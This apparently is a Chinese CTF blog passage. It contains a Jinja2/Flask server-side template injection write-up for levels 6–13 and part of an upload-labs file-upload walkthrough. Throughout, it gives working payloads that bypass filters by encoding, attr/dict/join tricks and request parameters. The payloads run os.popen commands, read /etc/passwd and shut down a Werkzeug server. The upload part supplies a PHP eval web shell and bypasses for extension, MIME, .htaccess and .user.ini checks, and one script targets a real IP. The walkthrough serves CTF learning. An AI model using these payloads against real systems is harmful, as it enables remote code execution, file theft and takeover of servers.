第二种方法，chr方法的利用，与python的chr()函数类似，用于将unicode编码转为对应字符，因为我们没法直接使用chr函数，所以需要通过__builtins__找到他，然后在{%%}中设置变量 12345678910111213141516171819import requestsimport html#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码url = 'http://124.70.99.199:5003/level/1'for i in range(0,500): payload = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__().__getitem__(%s).__init__.__globals__.__builtins__}}&quot;&quot;&quot;%i evalClass = &quot;&quot;&quot;{{''.__class__.__base__.__subclasses__().__getitem__(%s)}}&quot;&quot;&quot;%i r = requests.post(url,data={&quot;code&quot;:payload}).text evalclass_r = requests.post(url,data={&quot;code&quot;:evalClass}).text r = html.unescape(r) evalclass_r = html.unescape(evalclass_r) if &quot;chr&quot; in r: print(i,end='\\n') print(evalclass_r) #找到chr在第64个子类里 {{chr(65)}}将渲染为‘A’，如下图 %2b(‘+’)用于连接两个字符 1234{%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%}{{1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)).read()}}#等价于{%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%}{{1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}#这里一定注意import两端的下划线呜呜呜呜，忘记了这个模块有下划线，然后又是全都是ascii码好久都没发现 这样挨个对ascii码太麻烦了，写个python脚本 1234567str = &quot;cat /etc/passwd&quot;for index,char in enumerate(str): joinchr = '%2b' if index &lt; len(str)-1 else '' print(&quot;chr({})&quot;.format(ord(char)),end=joinchr) #output:chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100) 写脚本的时候再学点python新知识,enumerate()函数，用于将一个可迭代对象(列表、元组、字符串等)转化为枚举对象，枚举对象可提供迭代对象的元素及其索引，有点像foreach as 1234567fruits = ['apple', 'banana', 'orange']for index, fruit in enumerate(fruits): print(f&quot;Index {index}: {fruit}&quot;) #output:Index 0: apple#Index 1: banana#Index 2: orange level6下划线被过滤了，受上一题的启发，试试request，诶嘿，可行，这里不要用点来取值，用中括号，用点的话逻辑关系全乱了 好玩 去网上看了看，还有别的绕过姿势，编码绕过 十六进制编码绕过： 对’_’hex编码，是5f，写作转义序列，\\x5f 一个一个下划线转太麻烦，这里用python脚本 12345678910string = &quot;{{''.__class__.__base__.__subclasses__().__getitem__(64).__init__.__globals__.__builtins__}}&quot;string = string.replace('_',(hex(ord('_'))))string = string.replace('0x','\\\\x')print(string)#output：{{''.\\x5f\\x5fclass\\x5f\\x5f.\\x5f\\x5fbase\\x5f\\x5f.\\x5f\\x5fsubclasses\\x5f\\x5f().\\x5f\\x5fgetitem\\x5f\\x5f(64).\\x5f\\x5finit\\x5f\\x5f.\\x5f\\x5fglobals\\x5f\\x5f.\\x5f\\x5fbuiltins\\x5f\\x5f}}#再手动把点换为[]，包裹住记的字符串得加引号，只用把名字括起来就行了，函数的小括号在中括号外：{{''[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbase\\x5f\\x5f&quot;][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;](64)[&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;]}} payload： 1{{''[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbase\\x5f\\x5f&quot;][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;](64)[&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&quot;\\x5f\\x5fimport\\x5f\\x5f&quot;]('os').popen('cat /etc/passwd').read()}} ascii编码绕过： python中： 123456789101112131415161718{num:state}#num表示格式化字符在参数列表中的索引，不填默认递增#state表示格式说明符#%s：字符串格式化。将变量作为字符串显示。#%d：整数格式化。将变量作为十进制整数显示。#%f：浮点数格式化。将变量作为浮点数显示。#%x：十六进制格式化。将整数变量显示为小写十六进制数。#%X：十六进制格式化。将整数变量显示为大写十六进制数。#%o：八进制格式化。将整数变量显示为八进制数。#%c：字符格式化。将整数变量显示为对应的 Unicode 字符。#%r：原始数据格式化。使用 repr() 函数将变量转换为字符串显示。#这里我们要利用的就是%c&quot;{:c}&quot;.format(65)=='A'#因此&quot;{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}&quot;.format(95,95,99,108,97,115,115,95,95)='__class__' format()过滤器：(适用于中括号和点都被过滤) 1'%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95)=='__class__' attr()过滤器： 123code={{''|attr(&quot;{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}&quot;.format(95,95,99,108,97,115,115,95,95))|attr(&quot;\\x5f\\x5fbase\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;)()|attr(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(64)|attr(&quot;\\x5f\\x5finit\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5fgetitem\\x5f\\x5f&quot;)(&quot;\\x5f\\x5fimport\\x5f\\x5f&quot;)('os')|attr('popen')('cat /etc/passwd')|attr('read')()}}#取元素时一定要getitem，attr()过滤器用就要一用到底，不能与[],'.'等混用，也可unicode编码(\\u005f) 对于python2attr()内也可base64编码，但是我的题目环境是py3，所以无法实现 1&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;) 多种方式可以组合来： 1code={{''|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)()|attr(request.form.d)(64)|attr(request.form.e)|attr(request.form.f)|attr(request.form.d)(request.form.g)|attr(request.form.d)(request.form.h)(request.form.i)}}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__builtins__&amp;h=eval&amp;i=__import__('os').popen('cat /etc/passwd').read() level7点被过滤，前面讲过了，用中括号绕过。几种方式组合一下 payload： 1code={{''['__class__']['__base__']['__subclasses__']()[64]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen'](request['form']['cmd'])['read']()}}&amp;cmd=cat /etc/passwd 或者attr()过滤器，或者request对象绕过等等就不多说了 level8字符串拼接绕过： payload： 1code={{''['__clas''s__']['__bas''e__']['__subclas''ses__']()[64]['__ini''t__']['__globa''ls__']['__builtins__']['__import__']('os')['pop''en']('cat /etc/passwd').read()}} 拼接字符串也可以参考join()过滤器 中括号被ban用dict()函数创建字典：dict(__clas=1,s__=2)|join() jinja2中还支持’~’字符连接两个变量： 1{%set a='__cla' %}{%set b='ss__'%}{{&quot;&quot;[a~b]}} 或者字符串切片反转字符串： 反转字符串还可以使用reverse()过滤器绕实现 replace()过滤器： string()过滤器：将渲染在浏览器的部分转为一个字符串输出； select()过滤器： 但是不知道为什么，放到浏览器后会是这样的： 但是结合上那个string()过滤器，有点东西 能通过下标获取字符， 可以再简单点 拼个__class__看看，字符之间用~连接 假如说中括号被过滤了呢？怎么取下标，不慌，这里还有一个过滤器list()，能把字符串对象转化成列表对象输出： 这样一来就能用pop()方法输出字典内容了，当然用不用list()过滤器都能用__getitem__ level9数字被过滤了？ 不慌，有两个过滤器： length()过滤器： count()过滤器： index()函数获取数字 payload： 1code={{''['__class__']['__base__']['__subclasses__']()['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'|count()]['__init__']['__globals__']['__builtins__']['__import__']('os').popen(request.form.cmd).read()}}&amp;cmd=cat /etc/passwd 搞定，学习别人的方法，可以直接通过循环寻找可利用类，不需要数字： 1{% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__.__getitem__('os').popen('cat /etc/passwd').read()}}{% endif %}{% endfor %} 实际情况中可以自行选择可利用类，万一popen就被ban了呢？ level10把config关掉了 学习怎么查看配置的时候发现了一个好玩的： 在request对象中有一个叫做environ的对象，request.environ字典包含和服务器环境相关的对象，其中有一个’werkzeug.server.shutdown’=&gt;shutdown_server()的方法，所以当我们注入code={{request.environ['werkzeug.server.shutdown']()}}时 叮咚，程序停了 还发现某些情况下也可以不用那么麻烦地向前回溯到基类，再往下找可利用类和方法，一些内置的对象和函数 1234code={{url_for.__globals__.__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}code={{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}code={{request.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}code={{url_for.__globals__.__builtins__.__import__('os').system('ls')}} 学会了不用__globals__的注入姿势： 123#warnings.catch_warnings类内部定义了_module=sys.modules['warnings']，而warnings模块含有__builtins__，如果可以找到warnings.catch_warnings类,则可以不使用__globals__code={{''.__class__.__base__.__subclasses__()[157]()._module.__builtins__.__import__('os').popen('cat /etc/passwd').read()}} 还发现了过滤了class的话可以用dict直接跳过获取对象类的步骤： 最后总算找到了一篇文章，对于ssti的讲解还是比较到位的 如果过滤了config，又需要查config： 1{{get_flashed_messages.__globals__['current_app'].config}} 自己试了别的，发现url_for也可以，flask内置了这两个函数， level11 过滤了挺多东西的，点和中括号都被过滤了就得考虑attr()过滤器了，引号和request也被过滤了，那就拼字符，点被过滤所以chr的路暂时行不通(其实也不是不行就是很麻烦)，上面讲到过select()和string()还有list()过滤器 1{{1|select|string|list}} 考虑到attr()过滤器里面包含的是字符串，那就先拼个pop出来： 1{%set pop=dict(pop=a)|join()%}{{(1|select|string|list)|attr(pop)(0)}} 都做到这了，有了新的想法，为啥那么麻烦一个一个字符地拼接呢，直接字符串拼起来不就好了 没过滤下划线，那就把下划线设为一个变量，到时候变量与变量用~连接 1{%set under=dict(_=a)|join()%}{{under}} 再拼接关键词： 这里为了减少工作量，我们选择payload原型为： 1{{url_for.__globals__.__builtins__['__import__']('os').popen('cat /etc/passwd').read()}} 需要的引号内的关键字有__globals__,__import__,__builtins__,os,popen,read,cmd，当然选中__builtins__属性的话还需要__getitem__ 12345678{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set cmd=dict(cmd=a)|join()%} 先测试一下： 12345678910{%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set cmd=dict(ls=a)|join()%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(getitem)(popen)(cmd)|attr(read)()}} 可以看到已经成功导入os模块了！ payload： 12345678910{%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set cmd=dict(env=a)|join()%}{%set read=dict(read=a)|join()%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}} emmm，停，有点问题，空格咋办，执行命令时难免会碰到空格的吧，当我试着用上面类似的方法构造空格时我失败了 1{%set space=dict( =a)|join()%}#这种方法不行 还是得回到上面select过滤器那里，构造： 1{%set pop=dict(pop=a)|join()%}{%set space=(1|select|string|list)|attr(pop)(10)%} 这样就能构造空格啦 然后就成这样： 123456789101112{%set pop=dict(pop=a)|join()%}{%set space=(1|select|string|list)|attr(pop)(10)%}{%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set cmd=dict(la=a)|join()~space~dict(/=b)|join()%}{%set read=dict(read=a)|join()%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}} 啊啊啊啊啊啊还要再pop斜杠，好麻烦。。 浪费那么多时间不如试试request拼接 123456789101112{%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set req=dict(reques=a,t=b)|join()%}{%set form=dict(form=a)|join()%}{%set cmd=dict(cmd=a)|join()%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)((req|attr(form)|attr(cmd)))|attr(read)()}}&amp;cmd=ls 啥啥啥，又踩一个坑，这样传进去的是”request”字符串而根本不是request对象啊，那就去找request对象，运气不错，很快就找到了： 重新构造，虽然内置request，也就是说可通过{{request}}访问，但是注意这里构造的”request”依旧是字符串; 12345678910111213{%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set req=dict(reques=a,t=b)|join()%}{%set form=dict(form=a)|join()%}{%set a=dict(a=a)|join()%}{%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}} 至此，最终payload： 12345678910111213code={%set under=dict(_=a)|join()%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set req=dict(reques=a,t=b)|join()%}{%set form=dict(form=a)|join()%}{%set a=dict(a=a)|join()%}{%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%}{{url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}}&amp;a=cat /etc/passwd level12 和11题差不了多少，就是下划线被过滤了，那url_for就用不了了，下划线用select获取，然后因为0-9被过滤了，用length()或者count()过滤器获取数字,试着从{{request}}溯源然后反过来利用request也没弄成功，不过问题不大，这题没有ban掉request，直接用 pyaload： 123456789101112131415161718code={%set pop=dict(pop=a)|join()%}{%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%}{%set len=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join()|length()%}{%set under=(a|select|string|list)|attr(pop)(str|length())%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set base=under~under~dict(base=a)|join()~under~under%}{%set init=under~under~dict(init=a)|join()~under~under%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set subclasses=under~under~dict(subclasses=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{%set form=dict(form=a)|join()%}{%set a=dict(a=a)|join()%}{%set cmd=request|attr(form)|attr(getitem)(a)%}{{dict|attr(base)|attr(subclasses)()|attr(getitem)(len)|attr(init)|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}}&amp;a=cat /etc/passwd level13我去。。。乍一看还有点吓人哈 12345678910111213code={%set pop=dict(pop=a)|join()%}{%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%}{%set under=(a|select|string|list)|attr(pop)(str|length())%}{%set globals=under~under~dict(globals=a)|join()~under~under%}{%set base=under~under~dict(base=a)|join()~under~under%}{%set cmd=dict(whoami=a)|join()%}{%set builtins=under~under~dict(builtins=a)|join()~under~under%}{%set getitem=under~under~dict(getitem=a)|join()~under~under%}{%set import=under~under~dict(import=a)|join()~under~under%}{%set os=dict(os=a)|join()%}{%set popen=dict(popen=a)|join()%}{%set read=dict(read=a)|join()%}{{lipsum|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()}} 这样已经可以getshell了，用lipsum很方便可以不用数字，但是shell命令不放在单独的一个请求参数里真的很难受。。。 试了很久，request被禁了，上一题意外发现url_for可以访问到request，但是这一题下划线又被禁了。。好家伙。下划线被禁了url_for也没法用，没错下划线被ban了是可以绕过，但是最后组成的也只是”url_for”这样一个字符串而已，并不是对象本身，那request和url_for都是全局对象，url_for能访问到request，然后就去找flask中别的全局对象，看看能不能用和上一题类似的方法访问到url_for或者request，都没成功。。作罢 {{lipsum.__globals__.__builtins__}}里也有chr函数","link":"/2023/02/09/ssti/"},{"title":"star_ctf","text":"*CTF","link":"/2023/08/02/star-ctf/"},{"title":"文件上传","text":"uploads-labslevel1创建一个eval.php： 1&lt;?php eval($_POST['cmd']);?&gt; 被警告了，看一眼前端代码： 12345678910111213141516171819&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } }&lt;/script&gt; 前端检验后缀，把eval.php重命名为eval.jpg，bp抓包，改文件名，放行： 蚁剑连接： level2同上题一样的改包姿势行不通，不是前端验证，这里存在后端MEME验证， 这次改Content-Type为允许的类型来绕过 蚁剑连接 看一眼后端是怎么验证的： 123if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')){ //TODO} level3这次上传php木马后成这样： 常见替代.php后缀有php(1-8)，pHp(1-8)，phtml等等： ，这里设了个黑名单 1234567$deny_ext = array('.asp','.aspx','.php','.jsp');$file_name = trim($_FILES['upload_file']['name']);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //收尾去空 重命名eval.php为eval.phtml，上传 level4emmm，常见的后缀基本上都被过滤了。。 1$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;); ，但是还是后端后缀检查，没过滤.htaccess，传一个.htaccess，将jpg后缀解析为php 123&lt;FilesMatch &quot;eval.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 或者如下将所有文件解析为php： 1SetHandler application/x-httpd-php 或如下指定后缀解析为php 1AddType application/x-httpd-php .jpg 再上传eval.jpg脚本，最后蚁剑连接，当然前几题也适用，蚁剑连接： level5这个连.htaccess也过滤了，最后统一转为小写再进行过滤。。。挺严格的哈，瞅一眼提示： 注意到upload里始终有一个readme.php，没过滤php7，也没过滤.ini可以上传.ini文件： user.ini：(爱来自ChatGPT) 1234567891011121314151617user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 123auto_prepend_file 是 PHP 配置选项之一，用于指定一个在每个 PHP 文件执行之前自动包含（包含在头部）的文件。这个选项允许你在所有 PHP 脚本执行之前自动加载一些通用的代码或库，无需在每个脚本中手动包含。例如，如果你有一些通用的函数、类或设置，希望在所有 PHP 脚本执行之前都要加载，你可以通过配置 auto_prepend_file 来实现。这样，你只需在一个地方定义这些共享的代码，而不必在每个脚本中都进行手动包含。 在user.ini添加以下内容： 1auto_prepend_file=eval.jpg 在执行readme.php时会把eval.jpg的内容包含进去， level6没有进行小写转化且后缀过滤不够全面 123456$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 ，钻phP后缀空子 上传完之后在源代码处找到上传文件路径 level7和前面的关卡比起来，过滤中少了trim()空格过滤 上传成功后这里就懒得推算时间戳了（ level8与前面的相比，缺少了deldot()函数对结尾点号进行过滤 再蚁剑连接 这么说点可以绕过的话，上面level5也可以用.php. .后缀来绕过力 level9少了::$DATA 1php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。 但是，我是Linux（ 看别人操作（悲，等之后有机会碰到知道有这么一种姿势就行，(注意蚁剑连接时不用加$::DATA) level101234567$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);$file_name = trim($_FILES['upload_file']['name']);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 记得上面说的.php. .绕过罢 level11惯例上传一个eval.php，嗯？居然没报错 看一眼源代码，发现后缀没了 不多说，双写绕过试一下： 看一眼过滤，果然替换后缀为空： 1234$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); level12上传了eval.jpg，观察网页源码时发现路径中多了个’/‘， 观察后端源代码， 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} 如果后缀不为jpg|png|gif就无法上传，根据他的逻辑，刚想试着构造多后缀突然想到也行不通 白名单+get00截断，自己学习了相关知识，由于对应的漏洞php版本较旧相关插件缺失没法复现，(另一个主要原因是懒) level13post00截断，链接同level12 level14 和之前有所不同， 查看源码，源码检查文件前两个字节，之前在readthedocs上看到过： 